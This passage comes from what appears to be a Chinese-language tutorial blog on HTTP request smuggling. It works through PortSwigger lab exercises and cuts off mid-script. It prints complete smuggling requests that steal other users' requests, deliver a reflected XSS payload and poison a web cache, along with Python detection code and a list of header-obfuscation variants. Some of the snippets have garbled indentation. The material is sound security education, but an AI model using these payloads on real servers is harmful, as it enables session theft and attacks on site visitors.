class="line">csrf=za3lvdP3pkuZE53Npssm5z7LN48uUQoR&amp;postId=2&amp;name=mi1k7ea&amp;email=email%40qq.com&amp;website=&amp;comment=</span><br></pre></td></tr></table></figure><p>其中CL值为400，而后面数据的长度是不够400的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达400时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数comment的一部分，然后在指定的博文的评论中返回显示出来。</p><p>多请求几次，然后到该博文中查看评论就看到包括其他用户请求的信息（这里是User-Agent不同来辨别的）：</p><p><img src="/2020/03/11/浅析HRS漏洞/25.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/26.png" alt=""></p><h3 id="组合反射型XSS"><a href="#组合反射型XSS" class="headerlink" title="组合反射型XSS"></a>组合反射型XSS</h3><p>当HRS与反射型XSS组合利用时，就不再需要用户的交互来触发XSS了。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。该应用程序在User-Agent头处存在反射型XSS。 为了解决实验室问题，请将请求走私到后端服务器，该请求导致下一个用户的请求接收到包含执行<code>alert(1)</code>的XSS漏洞的响应。</p><p>首先我们找下存在反射型XSS的页面，根据提示是User-Agent注入的XSS，而我们在查看具体文章的时候确实是找到了这个接口存在User-Agent的反射型XSS：</p><p><img src="/2020/03/11/浅析HRS漏洞/27.png" alt=""></p><p>为了让这个反射型XSS的利用更多深入，我们结合HRS，这样无需用户交互就能触发XSS。构造如下请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac131fc91e3b433b80100743007900e8.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 74</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post?postId=4 HTTP/1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p>发送几次：</p><p><img src="/2020/03/11/浅析HRS漏洞/29.png" alt=""></p><p>然后刷新界面就会触发XSS弹框：</p><p><img src="/2020/03/11/浅析HRS漏洞/28.png" alt=""></p><h3 id="组合Web缓存投毒攻击"><a href="#组合Web缓存投毒攻击" class="headerlink" title="组合Web缓存投毒攻击"></a>组合Web缓存投毒攻击</h3><blockquote><p>一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。</p></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器配置为缓存某些响应。为了解决此问题，请执行请求走私攻击，使缓存中毒，以便随后对JavaScript文件的请求将重定向到漏洞利用服务器。中毒的缓存应alert(document.cookie)。</p><p>实验环境提供了漏洞利用的辅助服务器，这里我们编辑响应的报文如下，为了方便看效果先将alert(document.cookie)改为alert(1)：</p><p><img src="/2020/03/11/浅析HRS漏洞/30.png" alt=""></p><p>构造如下POST请求走私报文，这里可以通过HRS攻击使得该网站的下一个请求重定向到漏洞利用服务器上的/post接口，而我们知道该接口响应返回的是前面设置的alert(1)内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=1 HTTP/1.1</span><br><span class="line">Host: ac521f121f4e12738066379201d30067.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br></pre></td></tr></table></figure><p>接着重放访问其中随意一个js文件的报文，这里选择/resources/js/tracking.js，当上一个HRS攻击报文发送后，由其中”GET /post/next?postId=1 HTTP/1.1”之后的内容将会和当前的访问/resources/js/tracking.js的报文拼接起来，而此时合并的报文实际是访问漏洞利用服务器的js文件即响应返回“alert(1)”，此时缓存的/resources/js/tracking.js文件的内容实际上就被投毒攻击为“alert(1)”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /resources/js/tracking.js HTTP/1.1</span><br><span class="line">Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://aceb1fb41f8e127580ac37b400560067.web-security-academy.net/</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=mOFHLW0BPPkUKB4V858oSPuy3rTh9eUn</span><br></pre></td></tr></table></figure><p>上面POST和GET报文交替发送多次，然后点击第一篇博文查看，可以看到响应为缓存的漏洞利用服务器上的js文件：</p><p><img src="/2020/03/11/浅析HRS漏洞/31.png" alt=""></p><p>此时再访问主页，成功弹框，即缓存投毒攻击成功：</p><p><img src="/2020/03/11/浅析HRS漏洞/32.png" alt=""></p><h2 id="0x05-BurpSuite的HRS扫描原理"><a href="#0x05-BurpSuite的HRS扫描原理" class="headerlink" title="0x05 BurpSuite的HRS扫描原理"></a>0x05 BurpSuite的HRS扫描原理</h2><p>简单地说，BurpSuite是通过构造特定的数据包让后端服务器阻塞，通过超时机制来进行HRS漏洞检测的。</p><h3 id="CL-TE型HRS扫描原理"><a href="#CL-TE型HRS扫描原理" class="headerlink" title="CL.TE型HRS扫描原理"></a>CL.TE型HRS扫描原理</h3><p>针对CL.TE型HRS，BurpSuite发送以下报文进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><p>如果前端服务器是使用CL解析，那么根据数据包中的<code>Content-Length: 4</code>，前台服务器只会转发这个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1\r\n</span><br><span class="line">Z</span><br></pre></td></tr></table></figure><p>而后端服务器使用TE解析，由于前端服务器转发过了的body中并未有<code>0\r\n\r\n</code>，因此后端服务器会一直等待下一个chunked块的大小值，但由于没有因此会造成约为10s的超时。</p><p>但是当数据包中的<code>Content-Length: 11</code>时，因为Q是一个无效的块大小值（chunked块大小值用十六进制表示，Q不能表示十六进制数），所以后端服务器中该请求结束，不会产生超时，双换行是因为部分系统没有换行会进行等待，原因未知：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><p>如果服务端是TE.CL类型，则由于无效的块大小“Q”，前端服务器就已经拒绝该请求而不会转发到后端服务器中。这样可以防止后端服务器Socket中毒。</p><p>代码实现如下，先判断CL为4时是否超时，若超时且CL为11时不超时，如果CL为4的响应时间大于5s且CL为4的请求响应时间远大于CL为11的响应时间，即可认为存在CL.TE型HRS漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span><span class="params">(self)</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        headers[<span class="string">'Content-Length'</span>] = <span class="number">4</span></span><br><span class="line">        payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">        print(self.url, headers)</span><br><span class="line">        t2 = self.detect_CLTE(headers, payload)</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                headers[<span class="string">'Content-Length'</span>] = <span class="number">11</span></span><br><span class="line">                print(self.url, headers)</span><br><span class="line">                payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">                t1 = self.detect_CLTE(headers, payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">print</span> (t1, t2)</span><br><span class="line">                    <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                        self.valid = <span class="keyword">True</span></span><br><span class="line">                        self.type = <span class="string">"CL-TE"</span></span><br><span class="line">                        self.headers_payload = [headers]</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="TE-CL型HRS扫描原理"><a href="#TE-CL型HRS扫描原理" class="headerlink" title="TE.CL型HRS扫描原理"></a>TE.CL型HRS扫描原理</h3><p>针对TE.CL型HRS，BurpSuite发送以下报文进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure><p>因为前端服务器使用TE解析，<code>0\r\n\r\n</code>代表chunked结束，所以后端服务器只会收到如下部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>而由于后端服务器使用CL解析，解析<code>Content-Length: 6</code>便会尝试获取请求报文中的6字节内容，而<code>0\r\n\r\n</code>只有5个字节，后端服务器会等待第6个字节直至超时。</p><p>如果服务端是CL.TE类型，则此检测方法将使X毒化后端服务器的请求，从而可能损害合法用户。但是我们可以通过先执行CL.TE类HRS的检测再执行TE.CL类HRS的检测来避免这个问题。</p><p>代码实现如下，通过判断CL为6超时、CL为5不超时来确定是存在TE.CL型HRS漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span><span class="params">(self)</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        payload = <span class="string">"0\r\n\r\nX"</span></span><br><span class="line">        headers[<span class="string">'Content-Length'</span>] = <span class="number">6</span></span><br><span class="line">        print(self.url, headers)</span><br><span class="line">        t2 = self.detect_TECL(headers, payload)</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                print(self.url, headers)</span><br><span class="line">                payload = <span class="string">"0\r\n\r\n"</span></span><br><span class="line">                headers[<span class="string">'Content-Length'</span>] = <span class="number">5</span></span><br><span class="line">                t1 = self.detect_TECL(headers, payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">                        <span class="comment"># print (t1, t2)</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                            self.valid = <span class="keyword">True</span></span><br><span class="line">                            self.type = <span class="string">"TE-CL"</span></span><br><span class="line">                            self.headers_payload = [headers]</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="网上参考的脚本"><a href="#网上参考的脚本" class="headerlink" title="网上参考的脚本"></a>网上参考的脚本</h3><p>基于上面的基础，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author: xph</span></span><br><span class="line"><span class="string">CreateTime: 2019-09-18</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ReadTimeout</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">http.client._is_legal_header_name = <span class="keyword">lambda</span> x: <span class="keyword">True</span></span><br><span class="line">http.client._is_illegal_header_value = <span class="keyword">lambda</span> x: <span class="keyword">False</span></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">"res.txt"</span>, <span class="string">'a'</span>)</span><br><span class="line">fp.write(<span class="string">"\n"</span> + <span class="string">"-"</span> * <span class="number">50</span> + <span class="string">"\n"</span>)</span><br><span class="line">fp.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTP_REQUEST_SMUGGLER</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.headers_payload = []</span><br><span class="line">        self.valid = <span class="keyword">False</span></span><br><span class="line">        self.type = <span class="string">""</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.Transfer_Encoding1 = [[<span class="string">"Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding "</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer_Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">" Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"  chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\tchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\u000Bchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Content-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\n chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding\n "</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \"chunked\""</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" 'chunked'"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \n\u000Bchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \n\tchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked, cow"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow, "</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\r\nTransfer-encoding: cow"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunk"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cHuNkeD"</span>],</span><br><span class="line">                                   [<span class="string">"TrAnSFer-EnCODinG"</span>, <span class="string">" cHuNkeD"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" CHUNKED"</span>],</span><br><span class="line">                                   [<span class="string">"TRANSFER-ENCODING"</span>, <span class="string">" CHUNKED"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\r"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\t"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow\r\nTransfer-Encoding: chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow\r\nTransfer-Encoding: chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer\r-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"barn\n\nTransfer-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   ]</span><br><span class="line"></span><br><span class="line">        self.Transfer_Encoding = list(self.Transfer_Encoding1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.Transfer_Encoding1:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">" "</span> == x[<span class="number">1</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]:</span><br><span class="line">                    <span class="comment"># print (type(chr(i)))</span></span><br><span class="line">                    c = str(chr(i))</span><br><span class="line">                    self.Transfer_Encoding.append([x[<span class="number">0</span>], c + x[<span class="number">1</span>][<span class="number">1</span>:]])</span><br><span class="line"></span><br><span class="line">        self.payload_headers = []</span><br><span class="line">        self.n1 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.Transfer_Encoding:</span><br><span class="line">            headers = collections.OrderedDict()</span><br><span class="line">            headers[x[<span class="number">0</span>]] = x[<span class="number">1</span>]</span><br><span class="line">            headers[<span class="string">'Cache-Control'</span>] = <span class="string">"no-cache"</span></span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            headers[<span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span></span><br><span class="line">            self.payload_headers.append(headers)</span><br><span class="line">            self.n1 = self.n1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect_CLTE</span><span class="params">(self, headers=&#123;&#125;, payload=<span class="string">""</span>)</span>:</span></span><br><span class="line">        s = Session()</span><br><span class="line">        req = Request(<span class="string">'POST'</span>, self.url, data=payload)</span><br><span class="line">        prepped = req.prepare()</span><br><span class="line">        prepped.headers = headers</span><br><span class="line">        resp_time = <span 